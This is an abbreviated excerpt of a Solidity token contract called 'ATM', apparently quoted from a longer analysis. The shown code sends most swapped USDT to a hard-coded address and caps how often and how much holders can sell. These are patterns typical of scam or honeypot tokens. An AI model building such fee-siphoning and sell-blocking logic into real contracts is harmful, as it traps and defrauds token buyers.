...
contract ATM is ERC20 {
    ...
    address payable _backAddress = payable(address(0xdBD84EaE7152E9678af8cB07D2786dAd8a62C7Ea));
    ...
    constructor(address tokenOwner) ERC20("ATM", "ATM") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        _approve(address(this), address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10**22);
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            ...
            if(from == uniswapV2Pair){
                require(_buyTimes[to] < 2);
                require(amount <= 10**18);
                require(balanceOf(to).add(amount) <= 2 * 10**18);
                _buyTimes[to] += 1;
            }else if(to == uniswapV2Pair){
                require(outTime[from].add(86400) < block.timestamp);
                require(amount <= 2 * 10**17);
    ...
    function swapAndLiquifyV3(uint256 contractTokenBalance) private {
        ...
        if(newAmount > 0){
            USDT.transfer(_backAddress,newAmount.div(8).mul(6));
        }
    }
